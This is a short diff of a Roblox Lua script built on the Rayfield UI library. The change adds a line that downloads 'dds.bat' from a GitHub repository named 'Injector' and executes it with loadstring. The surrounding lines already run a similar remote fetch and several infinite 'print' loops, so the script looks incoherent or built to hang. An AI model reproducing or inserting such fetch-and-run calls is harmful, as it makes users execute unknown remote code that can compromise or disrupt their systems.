@@ -108,6 +108,8 @@ local Window = Rayfield:CreateWindow({
  repeat print("hi ") until false
  repeat print("hi ") until false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnyJonson/Injector/refs/heads/main/noob.py"))()
+--https://raw.githubusercontent.com/JohnyJonson/Injector/refs/heads/main/dds.bat
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnyJonson/Injector/refs/heads/main/dds.bat"))()
  repeat print("hi ") until false
  repeat print("hi ") until false
  repeat print("hi ") until false
